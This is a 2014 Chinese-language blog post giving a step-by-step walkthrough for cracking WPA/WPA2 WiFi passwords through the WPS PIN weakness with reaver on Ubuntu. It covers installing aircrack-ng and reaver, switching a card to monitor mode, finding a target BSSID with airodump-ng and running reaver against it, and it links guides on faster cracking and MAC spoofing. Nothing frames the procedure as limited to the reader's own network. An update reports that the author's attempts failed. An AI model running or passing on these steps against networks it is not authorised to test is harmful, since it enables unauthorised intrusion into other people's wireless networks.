---
layout: post
title: "Creak WPA2 WiFi password with reaver under Ubuntu"
date: Sat Mar  8 16:56:13 CST 2014
tags: [Ubuntu, software, creak]
categories: Software
code: 1
mathjax: 0
---
{% include JB/setup %}

使用reaver破解WPA2保护的WiFi密码
---

大部分路由器存在WPS(WiFi Protected Setup)漏洞，利用这个漏洞，只需最多尝试11000（4位数字+3位数字）个密码组合就可以破解出WPS registrar PIN密码，有了这个PIN密码就可以获得WiFi的密码了，也可以更改WiFi设置。[reaver官网](https://code.google.com/p/reaver-wps/)说破解需要的时间是4-10小时，依据WiFi信号强弱而定。

---

## 安装 aircrack-ng

~~~bash
sudo apt-get install libssl-dev
wget http://download.aircrack-ng.org/aircrack-ng-1.2-beta2.tar.gz
tar -xzf aircrack-ng-1.2-beta2.tar.gz
cd aircrack-ng-1.2-beta2
make
sudo make install
~~~

注：aircrack的官网被墙
参考：<http://answertohow.blogspot.in/2012/10/how-to-install-aircrack-ng-on-ubuntu.html>

## 安装 reaver

~~~bash
sudo apt-get install libpcap-dev libsqlite3-dev iw
wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz
tar -xzf reaver-1.4.tar.gz
cd reaver-1.4/src
./configure
make
sudo make install
~~~

注：在reaver-1.4/docs里有关于reaver原理和WPS漏洞的说明
参考：<http://answertohow.blogspot.in/2012/11/how-to-install-reaver-on-ubuntu.html>

## 开始破解

### 将无线网卡设置为“监视”模式

~~~bash
sudo airmon-ng start wlan0
~~~

### 找到要破解的WiFi热点的BSSID

~~~bash
sudo airodump-ng mon0
~~~

按Ctrl + C 退出。从上面命令的输出可以找到要破解WiFi热点的BSSID，还可以确认其使用的加密方式是WPA/WPA2（在ENC这一列）。

### 启动reaver开始破解

~~~bash
reaver -i mon0 -b aa:bb:cc:dd:ee:ff -vv | tee crack.log
~~~

其中 aa:bb:cc:dd:ee:ff 换成上面得到的BSSID。然后就是祈祷了。

---

## 参考：

- [如何使用Reaver破解Wi-Fi网络的WPA密码](http://blog.csdn.net/tinyeyeser/article/details/17127805)（讲的是使用BT5刻光盘进行破解，如果不使用Linux, 可以看看这个）
- [How to Crack a Wi-Fi Network’s WPA Password with Reaver](http://answertohow.blogspot.in/2012/12/how-to-crack-wi-fi-networks-wpa.html)（这个链接讲到了如何加速破解，以及伪造MAC地址）

======
Update:

沮丧，尝试破解自己的Wifi和另一个Wifi，均未成功。
